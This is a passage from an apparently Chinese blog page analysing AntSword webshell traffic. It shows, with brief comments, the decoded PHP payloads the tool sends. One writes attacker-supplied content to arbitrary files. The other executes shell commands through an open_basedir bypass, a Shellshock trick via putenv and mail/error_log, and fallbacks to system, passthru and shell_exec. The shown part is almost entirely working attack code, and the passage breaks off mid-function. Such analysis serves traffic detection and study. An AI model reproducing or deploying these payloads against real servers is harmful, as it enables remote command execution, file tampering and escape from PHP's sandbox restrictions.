</span></span><span class=line><span class=cl><span class=c1>// 自定义函数，获取输出缓冲区内容并进行处理
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>asoutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$output</span> <span class=o>=</span> <span class=nx>ob_get_contents</span><span class=p>();</span> <span class=c1>// 获取输出缓冲区内容
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>ob_end_clean</span><span class=p>();</span> <span class=c1>// 清空输出缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;fb708664&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=o>@</span><span class=nx>asenc</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;870b983ed5&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 开始输出缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 解码POST请求中的文件路径和内容
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$f</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;idb82191cedb24&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;e748c4dcd196bb&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$buf</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将内容进行URL解码
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span> <span class=nv>$i</span> <span class=o>+=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$buf</span> <span class=o>.=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=s2>&#34;%&#34;</span> <span class=o>.</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$i</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将解码后的内容写入文件，并返回结果
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=p>(</span><span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nx>fopen</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>),</span> <span class=nv>$buf</span><span class=p>)</span> <span class=o>?</span> <span class=s2>&#34;1&#34;</span> <span class=o>:</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 如果发生异常，输出错误信息
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;ERROR://&#34;</span> <span class=o>.</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 调用自定义函数处理输出
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>asoutput</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// 终止脚本执行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=reverse><span>Reverse</span>
<a href=#reverse class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><h4 class=heading-element id=rot13><span>ROT13</span>
<a href=#rot13 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$opdir</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$opdir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ocwd</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$oparr</span> <span class=o>=</span> <span class=nx>preg_split</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Lzt8Oi8=&#34;</span><span class=p>),</span> <span class=nv>$opdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>array_push</span><span class=p>(</span><span class=nv>$oparr</span><span class=p>,</span> <span class=nv>$ocwd</span><span class=p>,</span> <span class=nx>sys_get_temp_dir</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$oparr</span> <span class=k>as</span> <span class=nv>$item</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>is_writable</span><span class=p>(</span><span class=nv>$item</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nv>$item</span> <span class=o>.</span> <span class=s2>&#34;/.9315a2db7e5d&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nx>realpath</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cntarr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>preg_split</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\\\</span><span class=s2>|\//&#34;</span><span class=p>,</span> <span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$cntarr</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>rmdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>};;</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>asenc</span><span class=p>(</span><span class=nv>$out</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>asoutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$output</span> <span class=o>=</span> <span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;80&#34;</span> <span class=o>.</span> <span class=s2>&#34;324&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=o>@</span><span class=nx>asenc</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;5a9&#34;</span> <span class=o>.</span> <span class=s2>&#34;ae81&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$p</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nd940e9a247057&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;ca662241d33bb8&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$envstr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;uf4fe7e98c2272&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$d</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span> <span class=o>?</span> <span class=s2>&#34;-c </span><span class=se>\&#34;</span><span class=si>{</span><span class=nv>$s</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=s2>&#34;/c </span><span class=se>\&#34;</span><span class=si>{</span><span class=nv>$s</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PATH=&#34;</span> <span class=o>.</span> <span class=nx>getenv</span><span class=p>(</span><span class=s2>&#34;PATH&#34;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PATH=&#34;</span> <span class=o>.</span> <span class=nx>getenv</span><span class=p>(</span><span class=s2>&#34;PATH&#34;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$envstr</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$envarr</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;|||asline|||&#34;</span><span class=p>,</span> <span class=nv>$envstr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$envarr</span> <span class=k>as</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$v</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;|||askey|||&#34;</span><span class=p>,</span> <span class=s2>&#34;=&#34;</span><span class=p>,</span> <span class=nv>$v</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$r</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{</span><span class=nv>$p</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=nv>$c</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>fe</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$d</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>,</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;disable_functions&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$d</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$d</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$d</span> <span class=o>=</span> <span class=nx>array_map</span><span class=p>(</span><span class=s1>&#39;trim&#39;</span><span class=p>,</span> <span class=nx>array_map</span><span class=p>(</span><span class=s1>&#39;strtolower&#39;</span><span class=p>,</span> <span class=nv>$d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>is_callable</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nv>$d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>runshellshock</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=nv>$c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span> <span class=o>&amp;&amp;</span> <span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;putenv&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;error_log&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;mail&#39;</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>strstr</span><span class=p>(</span><span class=nx>readlink</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>),</span> <span class=s2>&#34;bash&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$tmp</span> <span class=o>=</span> <span class=nx>tempnam</span><span class=p>(</span><span class=nx>sys_get_temp_dir</span><span class=p>(),</span> <span class=s1>&#39;as&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PHP_LOL=() { x; }; </span><span class=si>$c</span><span class=s2> &gt;</span><span class=si>$tmp</span><span class=s2> 2&gt;&amp;1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;error_log&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>error_log</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>mail</span><span class=p>(</span><span class=s2>&#34;a@127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;-bv&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>False</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$output</span> <span class=o>=</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$output</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>False</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>runcmd</span><span class=p>(</span><span class=nv>$c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$d</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;passthru&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>passthru</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;shell_exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>));</span>
